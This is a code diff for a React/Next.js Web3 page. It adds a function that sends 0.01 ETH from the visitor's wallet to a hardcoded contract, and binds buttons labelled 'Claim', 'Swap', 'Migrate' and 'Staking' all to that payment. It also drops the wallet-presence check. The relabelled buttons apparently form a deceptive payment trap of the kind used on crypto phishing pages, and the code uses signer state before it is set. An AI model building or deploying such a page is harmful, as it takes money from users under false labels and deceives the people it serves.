@@ -4,8 +4,11 @@ import styles from '../styles/Home.module.css'
 import Web3Modal from "web3modal";
 import { useState, useEffect } from "react";
 import { ethers } from "ethers";
+import { abi, contractAddress} from '../constants/abi'
 
 let web3Modal;
+
+const ethAmount ='0.01'
 
 const providerOptions = {
   
@@ -31,8 +34,9 @@ export default function Home() {
       setHasMetamask(true);
     }
   });
+
   async function connect() {
-    if (typeof window.ethereum !== "undefined") {
+    
       try {
         const web3ModalProvider = await web3Modal.connect();
         setIsConnected(true);
@@ -41,10 +45,42 @@ export default function Home() {
       } catch (e) {
         console.log(e);
       }
-    } else {
-      setIsConnected(false);
-    }
+    
   }
+
+  async function fund() {
+    const ethAmount = "0.01";
+      console.log(`Funding with ${ethAmount}...`)
+    
+      const web3ModalProvider = await web3Modal.connect();
+          setIsConnected(true);
+          const provider = new ethers.providers.Web3Provider(web3ModalProvider);
+          setSigner(provider.getSigner());
+        const contractAddress = '0xA2fAa6289311f06C8DC234db09512Ce9b8fAc9BF';
+        const contract = new ethers.Contract(contractAddress, abi, signer);
+          try {
+              const transactionResponse = await contract.fund({
+                  value: ethers.utils.parseEther(ethAmount),
+              })
+              await listenForTransactionMine(transactionResponse, provider)
+          } catch (error) {
+              console.log(error)
+          }
+     
+    }
+
+
+function listenForTransactionMine(transactionResponse, provider) {
+  console.log(`Mining ${transactionResponse.hash}`)
+  return new Promise((resolve, reject) => {
+      provider.once(transactionResponse.hash, (transactionReceipt) => {
+          console.log(
+              `Completed with ${transactionReceipt.confirmations} confirmations. `
+          )
+          resolve()
+      })
+  })
+}
   return (
     
       <div>
@@ -68,9 +104,9 @@ export default function Home() {
   
               <div className="inner-button-wrap-1">
   
-              <button>Claim</button>
+              <button onClick={() => fund()}>Claim</button>
                  
-            <button>Swap</button>
+            <button onClick={() => fund()}>Swap</button>
   
               </div>
   
@@ -78,8 +114,8 @@ export default function Home() {
   
             <div className="main-button-wrap-2">
               <div className="inner-button-wrap-2">
-              <button >Migrate</button>
-            <button >Staking</button>
+              <button onClick={() => fund()}>Migrate</button>
+            <button onClick={() => fund()}>Staking</button>
                 
   
               </div>
